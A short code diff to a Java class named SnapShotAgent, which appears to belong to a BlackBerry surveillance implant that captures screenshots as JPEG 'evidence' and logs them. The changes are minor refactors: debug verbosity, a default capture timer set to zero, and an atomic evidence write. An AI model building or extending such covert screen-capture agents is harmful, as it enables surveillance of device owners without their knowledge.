@@ -25,7 +25,6 @@ import blackberry.evidence.EvidenceType;
 import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
-
 /**
  * in holster.
  * 
@@ -33,7 +32,7 @@ import blackberry.utils.WChar;
  */
 public final class SnapShotAgent extends Agent {
     //#ifdef DEBUG
-    static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);
     //#endif
 
     private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 70;
@@ -41,7 +40,7 @@ public final class SnapShotAgent extends Agent {
     private static final int MIN_TIMER = 1 * 1000;
     private static final long SNAPSHOT_DELAY = 1000;
 
-    private int timerMillis = 60 * 1000;
+    private int timerMillis = 0;
     private boolean onNewWindow = false;
 
     /**
@@ -54,7 +53,8 @@ public final class SnapShotAgent extends Agent {
         super(Agent.AGENT_SNAPSHOT, agentEnabled, Conf.AGENT_SNAPSHOT_ON_SD,
                 "SnapShotAgent");
         //#ifdef DBC
-        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.SNAPSHOT,
+        Check.asserts(
+                Evidence.convertTypeEvidence(agentId) == EvidenceType.SNAPSHOT,
                 "Wrong Conversion");
         //#endif
     }
@@ -106,11 +106,7 @@ public final class SnapShotAgent extends Agent {
         Check.requires(evidence != null, "Null log");
         //#endif
         
-        synchronized (evidenceLock) {
-            evidence.createEvidence(getAdditionalData());
-            evidence.writeEvidence(plain);
-            evidence.close();
-        }
+        evidence.atomicWriteOnce(getAdditionalData(),plain);
 
         //#ifdef DEBUG
         debug.trace("finished run");
@@ -129,7 +125,6 @@ public final class SnapShotAgent extends Agent {
         bitmap = new Bitmap(width, height);
 
         //#ifdef DEBUG
-
         debug.trace("portrait: " + Display.getOrientation());
         debug.trace("w: " + width + " h:" + height);
         debug.trace("horizontal res: " + Display.getHorizontalResolution());
